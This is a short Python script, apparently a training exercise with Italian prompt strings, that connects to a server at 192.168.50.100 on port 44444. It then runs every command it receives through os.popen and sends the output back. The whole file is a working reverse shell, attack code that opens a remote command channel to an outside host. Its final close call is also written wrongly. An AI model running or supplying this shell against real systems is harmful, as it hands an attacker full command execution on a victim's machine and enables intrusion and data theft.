import socket
import os


SRV_ADDR = "192.168.50.100"
SRV_PORT = 44444

connection= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect((SRV_ADDR, SRV_PORT))


while True:
    output = os.popen("pwd").read().rstrip() + " $ "
    connection.sendall(output.encode("utf-8"))
    data = connection.recv(1024)
    print(f"Received from server: {data.decode()}")
    if not data: 
        break
    cmd  = data.decode("utf-8").rstrip()
    if cmd == "help":
        connection.sendall("Esegui qualsiasi comando\n".encode("utf-8"))
    elif cmd == "ciao":
        connection.sendall(b"come stai?\n")
    else:
        output = os.popen(cmd).read() + "\n"
        connection.sendall(output.encode("utf-8"))
    print(data.decode("utf-8"))
connection.connect.close()